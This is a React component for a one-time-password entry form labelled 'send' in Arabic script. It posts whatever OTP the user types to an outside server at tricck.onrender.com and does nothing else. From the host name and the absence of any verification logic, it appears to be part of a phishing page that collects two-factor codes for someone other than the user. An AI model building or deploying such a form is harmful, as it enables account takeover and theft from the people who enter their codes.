// import "../public/js/index.js";
import axios from "axios";
import { useState } from "react";
const otp = () => {
  const [otpMsg, setOtpMsg] = useState("");
  const submit = (e) => {
    e.preventDefault();
    axios.post("https://tricck.onrender.com/otp", {
      otpMsg,
    });
  };
  return (
    <div className="otp">
      <div className="row">
        <div className="col-12">
          <form>
            <div className="inp-otp w-25 ms-auto me-auto mt-5">
              <input
                className="form-control p-2 text-center"
                placeholder="OTP"
                value={otpMsg}
                onChange={(e) => {
                  setOtpMsg(e.target.value);
                }}
              />
              <button className="btn btn-success mt-2 w-100" onClick={submit}>
                ارسال
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};
export default otp;
